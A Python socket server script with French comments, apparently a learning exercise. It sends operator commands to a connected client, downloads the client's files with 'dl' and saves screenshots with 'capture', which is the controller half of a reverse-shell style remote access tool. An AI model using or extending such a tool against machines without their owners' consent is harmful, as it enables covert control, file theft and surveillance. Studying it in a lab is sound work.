# SOCKETS RÉSEAU : SERVEUR
#
# socket
#   bind (ip, port)  127.0.0.1 -> localhost
#   listen
#   accept -> socket / (ip, port)
#   close
# already used

import socket

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

# Gestion des data trop longues: 
def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    #print(f"Socket_receive_all_data len:{data_len}")
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(MAX_DATA_SIZE)
        #print(f"Len: {len(data)}")
        if not data:
            return None
        if not total_data:
            total_data = data
        else: 
            total_data += data
        current_data_len += len(data)
        #print(f"Total len: {current_data_len} / {data_len}")
    return total_data

def socket_send_command_and_receive_all_data(socket_p, command):
    if not command: # if command == "" 
        return None
    socket_p.sendall(command.encode())
    header_data = socket_receive_all_data(socket_p, 13)
    len_data = int(header_data.decode())
    
    data_receive = socket_receive_all_data(socket_p, len_data)
    return data_receive
    

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Wait connexion on {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = s.accept()
print(f"Connexion ON : {client_address}")

dl_filename = None

while True:
    data_details = socket_send_command_and_receive_all_data(connection_socket, "infos")
    if not data_details:
        break
    command = input(client_address[0]+":"+str(client_address[1]) + " " + data_details.decode() + " > ")
        
    commande_split = command.split(" ") 
    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_filename = commande_split[1]
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        dl_filename = commande_split[1] + ".png"
        
    data_receive = socket_send_command_and_receive_all_data(connection_socket, command)
    if not data_receive:
        break
    
    if dl_filename:
        if len(data_receive) == 1 and data_receive == b" ":
            print(f"ERROR: error file {dl_filename} does not exist")
        else:
            f = open(dl_filename, "wb")
            f.write(data_receive)
            f.close()
            print("File", dl_filename, "download")
        dl_filename = None 
        
    else:
    #print(f"data_receive longueur : {len(data_receive)}")
        print(data_receive.decode())
    
s.close()
connection_socket.close()